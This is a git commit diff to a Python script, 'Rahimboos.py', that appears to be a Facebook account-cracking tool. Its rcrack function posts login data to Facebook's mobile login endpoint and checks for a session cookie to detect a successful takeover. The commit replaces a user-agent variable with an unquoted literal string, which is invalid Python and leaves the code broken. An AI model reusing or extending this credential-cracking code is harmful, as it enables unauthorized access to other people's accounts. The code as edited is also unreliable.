272af8b8f3cde8c5eb61cd0c53da5ce6d36f7646
paderbapar2022 <64470606+paderbapar2022@users.noreply.github.com>
2023-04-02 10:07:28 +0600

    Update Rahimboos.py

--- Rahimboos.py
+++ Rahimboos.py
@@ -237,7 +237,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            'user-agent': Mozilla/5.0 (Linux; Android 11; Infinix X693) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
